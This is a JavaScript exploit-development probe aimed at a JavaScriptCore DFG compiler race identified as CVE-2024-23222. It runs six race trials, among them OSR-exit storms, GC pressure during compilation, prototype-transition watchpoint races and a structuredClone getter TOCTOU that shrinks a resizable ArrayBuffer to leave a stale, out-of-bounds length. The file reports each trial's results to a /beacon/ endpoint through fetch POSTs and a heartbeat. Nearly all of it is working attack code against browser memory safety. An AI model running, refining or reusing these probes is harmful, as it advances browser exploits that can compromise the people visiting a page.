/* p72-dfgrace — CVE-2024-23222 concurrent DFG compilation race
 * The bug requires the DFG COMPILER THREAD to read a property value
 * while the MAIN THREAD changes it. Single-threaded tests can't hit this.
 * Strategy: force repeated DFG recompilation (via type pollution / OSR exits)
 * while mutating the target property, hoping to race the compiler snapshot.
 *
 * Also: test tryGetConstantProperty specifically — it reads cell values
 * under a lock then returns the raw JSValue. If GC runs between the read
 * and freeze(), the cell can be freed.
 *
 * Beacon prefix: V72R-
 */
(function(){
"use strict";
var RUN_ID = "v72r" + Math.random().toString(36).slice(2,12);
var PREFIX = "V72R-";

function B(tag, body) {
  try {
    var d = typeof body === "object" ? JSON.stringify(body) : String(body);
    fetch("/beacon/" + PREFIX + tag, {
      method: "POST", body: JSON.stringify({r: RUN_ID, b: d.slice(0,900)}),
      headers: {"Content-Type":"application/json"}
    }).catch(function(){});
  } catch(e){}
}
B("L", "press72-DFG concurrent race");

/* ====== R1: OSR exit storm + property mutation ====== */
/* Force DFG to compile, hit OSR exit, recompile, while we mutate target */
function test_R1() {
  var r = {};
  try {
    var sentinel = { tag: "OLD", id: 1 };
    var container = { ref: sentinel };
    Object.seal(container);

    var staleHits = 0;
    var totalChecks = 0;
    var osrExits = 0;

    function hotFunc(obj) {
      var v = obj.ref;
      return v.tag;
    }

    // Phase 1: warm up as monomorphic
    for (var i = 0; i < 20000; i++) hotFunc(container);

    // Phase 2: cause OSR exits by passing different shaped objects
    // This forces DFG to recompile hotFunc
    var shapes = [];
    for (var s = 0; s < 8; s++) {
      var o = { ref: { tag: "SHAPE" + s } };
      Object.seal(o);
      shapes.push(o);
    }

    // Phase 3: interleave — call with different shapes (causing recompilation)
    // while simultaneously mutating container.ref on the main thread
    function raceRound(round) {
      // Pollute with different shape to cause OSR exit
      for (var j = 0; j < 500; j++) {
        hotFunc(shapes[j % shapes.length]);
        osrExits++;
      }

      // Now change the target value
      var newSentinel = { tag: "NEW" + round, id: round + 1000 };
      container.ref = newSentinel;

      // Immediately call hotFunc many times — if DFG is mid-recompile
      // and snapshots the OLD value, we'll get "OLD" or a previous "NEWx"
      for (var k = 0; k < 5000; k++) {
        var result = hotFunc(container);
        totalChecks++;
        if (result !== "NEW" + round) {
          staleHits++;
        }
      }
    }

    for (var round = 0; round < 200; round++) {
      raceRound(round);
    }

    r.stale = staleHits;
    r.total = totalChecks;
    r.osrExits = osrExits;
    r.RACE_HIT = staleHits > 0;

  } catch(e) { r.err = e.message.slice(0,80); }
  B("R1-OSR", r);
}

/* ====== R2: GC pressure during compilation window ====== */
function test_R2() {
  var r = {};
  try {
    var alive = { marker: "ALIVE", ptr: new ArrayBuffer(64) };
    var box = { cell: alive };
    Object.seal(box);

    function readCell() { return box.cell.marker; }

    // Warm up
    for (var i = 0; i < 30000; i++) readCell();

    var stale = 0;
    var checks = 0;

    for (var round = 0; round < 100; round++) {
      // Replace the cell value
      var replacement = { marker: "R" + round, ptr: new ArrayBuffer(64) };
      box.cell = replacement;

      // Create massive GC pressure — allocate and discard many objects
      // This increases the chance that GC runs during DFG compilation
      var garbage = [];
      for (var g = 0; g < 10000; g++) {
        garbage.push({ a: g, b: new ArrayBuffer(128) });
      }
      garbage = null; // eligible for GC

      // Check if DFG returns stale value
      for (var c = 0; c < 1000; c++) {
        var v = readCell();
        checks++;
        if (v !== "R" + round) stale++;
      }
    }

    r.stale = stale;
    r.checks = checks;
    r.RACE_HIT = stale > 0;

  } catch(e) { r.err = e.message.slice(0,80); }
  B("R2-GC", r);
}

/* ====== R3: Watchpoint invalidation race ====== */
/* The CVE specifically: DFG watches S1 and S3, but not S2.
 * We need to transition through S2 while DFG is compiling. */
function test_R3() {
  var r = {};
  try {
    // Strategy: create an object, let DFG compile a function reading it,
    // then rapidly transition through multiple structures

    var protos = [];
    for (var p = 0; p < 5; p++) {
      protos.push(Object.create(null));
    }

    var target = Object.create(protos[0]);
    target.val = 42;

    function readTarget() { return target.val; }

    // Warm up with stable structure
    for (var i = 0; i < 50000; i++) readTarget();

    var stale = 0;
    var checks = 0;

    // Rapid structure transitions while calling the function
    for (var round = 0; round < 500; round++) {
      // Transition by changing prototype (structure change in JSC)
      Object.setPrototypeOf(target, protos[round % protos.length]);
      target.val = 1000 + round;

      // Immediately check
      for (var c = 0; c < 100; c++) {
        var v = readTarget();
        checks++;
        if (v === 42) stale++;
      }
    }

    r.stale = stale;
    r.checks = checks;
    r.RACE_HIT = stale > 0;

  } catch(e) { r.err = e.message.slice(0,80); }
  B("R3-WATCHPOINT", r);
}

/* ====== R4: Async compilation race — use Promise microtasks ====== */
function test_R4() {
  var r = {};
  try {
    var obj = { x: "ORIGINAL" };
    Object.seal(obj);

    function readX() { return obj.x; }

    // Warm up
    for (var i = 0; i < 50000; i++) readX();

    var stale = 0;
    var checks = 0;
    var resolved = false;

    // Create a chain of microtasks that mutate the property
    // Microtasks run between macro-tasks, potentially during JIT pauses
    var chain = Promise.resolve();
    for (var r2 = 0; r2 < 200; r2++) {
      (function(round) {
        chain = chain.then(function() {
          obj.x = "ROUND" + round;
          // Tight loop to race against compiler
          for (var j = 0; j < 5000; j++) {
            var v = readX();
            checks++;
            if (v === "ORIGINAL") stale++;
          }
        });
      })(r2);
    }

    chain.then(function() {
      r.stale = stale;
      r.checks = checks;
      r.RACE_HIT = stale > 0;
      B("R4-MICROTASK", r);
    });

  } catch(e) {
    r.err = e.message.slice(0,80);
    B("R4-MICROTASK", r);
  }
}

/* ====== R5: Deopt + reopt cycle with type instability ====== */
function test_R5() {
  var r = {};
  try {
    var state = { val: 42 };
    Object.seal(state);

    function readVal() { return state.val; }

    var stale = 0;
    var checks = 0;

    for (var cycle = 0; cycle < 50; cycle++) {
      // Phase A: warm up with integer → DFG compiles for int
      state.val = cycle * 100;
      for (var i = 0; i < 10000; i++) readVal();

      // Phase B: change to string → causes OSR exit, DFG deoptimizes
      state.val = "STR" + cycle;

      // Phase C: rapid checks during deopt/reopt window
      for (var j = 0; j < 2000; j++) {
        var v = readVal();
        checks++;
        if (v === cycle * 100 || typeof v === "number") stale++;
      }

      // Phase D: change to object → another type change
      state.val = { nested: cycle };
      for (var k = 0; k < 2000; k++) {
        var v2 = readVal();
        checks++;
        if (v2 === "STR" + cycle || typeof v2 === "string") stale++;
      }
    }

    r.stale = stale;
    r.checks = checks;
    r.RACE_HIT = stale > 0;

  } catch(e) { r.err = e.message.slice(0,80); }
  B("R5-TYPEFLIP", r);
}

/* ====== R6: Getter + DFG constant fold (combine TOCTOU + DFG) ====== */
function test_R6() {
  var r = {};
  try {
    // Use our known-working TOCTOU (structuredClone getter race)
    // to corrupt a DFG-folded value

    var rab = new ArrayBuffer(256, { maxByteLength: 256 });
    var u8 = new Uint8Array(rab);
    for (var i = 0; i < 256; i++) u8[i] = 0xCC;

    var state = { buf: rab };
    Object.seal(state);

    function readBufLen() { return state.buf.byteLength; }

    // Warm up — DFG should constant-fold state.buf → the RAB
    for (var j = 0; j < 50000; j++) readBufLen();
    r.warmupLen = readBufLen(); // 256

    // Now: shrink via TOCTOU
    var obj = Object.create(null);
    obj.data = rab;
    Object.defineProperty(obj, 'zz', { enumerable: true, get: function() {
      rab.resize(16);
      return 1;
    }});

    var cloned = structuredClone(obj);
    r.clonedLen = cloned.data.byteLength; // should be 256 (OOB from TOCTOU)
    r.rabNow = rab.byteLength; // 16 (after shrink)

    // Now check: does the DFG-compiled readBufLen still return 256?
    // If DFG folded the RAB reference and reads byteLength from the
    // TOCTOU-shrunk buffer, it should return 16.
    // But if it cached the buffer object AND its length...
    var afterToctou = readBufLen();
    r.afterToctou = afterToctou;
    r.DFG_CACHED_LEN = afterToctou === 256; // TRUE = DFG cached old length!
    r.DFG_CORRECT = afterToctou === 16;

    // Also check: replace the buffer entirely
    var newBuf = new ArrayBuffer(512);
    state.buf = newBuf;
    var afterReplace = readBufLen();
    r.afterReplace = afterReplace;
    r.DFG_STALE_REF = afterReplace === 16 || afterReplace === 256; // old buf!

  } catch(e) { r.err = e.message.slice(0,80); }
  B("R6-TOCTOU-DFG", r);
}

/* ====== Run ====== */
try {
  test_R1();
  setTimeout(test_R2, 500);
  setTimeout(test_R3, 1500);
  setTimeout(test_R4, 2500);
  setTimeout(test_R5, 4000);
  setTimeout(test_R6, 5500);
} catch(e) { B("FATAL", String(e).slice(0,200)); }

var hbI = setInterval(function(){ B("HB","hb"); }, 2000);
setTimeout(function(){ clearInterval(hbI); B("Z2","probe72-done"); }, 25000);
})();
